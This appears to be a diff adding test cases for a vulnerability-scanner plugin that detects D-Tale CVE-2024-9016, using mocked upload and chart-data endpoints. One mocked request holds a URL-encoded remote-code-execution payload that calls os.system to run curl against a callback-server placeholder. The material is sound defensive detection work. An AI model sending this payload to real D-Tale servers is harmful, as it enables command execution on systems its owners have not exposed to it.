@@ -1,0 +1,83 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Dtale_CVE_2024_9016"
+}
+
+tests: {
+  name: "whenVulnerable_returnsTrue"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/dtale/popup/upload"
+        status: 200
+        body_content: "<title>My App - Load Data</title> \n script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+                      "<script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+      },
+      {
+        uri: "/dtale/upload"
+        status: 200
+        body_content: '{"data_id":"112233","success":true}'
+        condition: {
+          headers: [
+            { name: "Content-Type" value: "multipart/form-data; boundary=----geckoformboundaryb38fffc548bd5dad82328985c3f223d4" }
+          ]
+          body_content: '------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="simple-dtale-data.csv"; filename="simple-dtale-data.csv"\r\nContent-Type: text/csv\r\n\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="header"\r\n\r\ntrue\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="separatorType"\r\n\r\ncomma\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4\r\nContent-Disposition: form-data; name="separator"\r\n\r\n\r\n------geckoformboundaryb38fffc548bd5dad82328985c3f223d4--\r\n'
+        }
+      },
+      {
+        uri: "/dtale/chart-data/112233?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29"
+        status: 200
+        body_content: "\"error\":\""
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNoCallback_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/dtale/popup/upload"
+        status: 200
+        body_content: "<title>My App - Load Data</title> script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>"
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNotDocsGPT_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
+        status: 200
+        body_content: "Hello world"
+      }
+    ]
+  }
+}
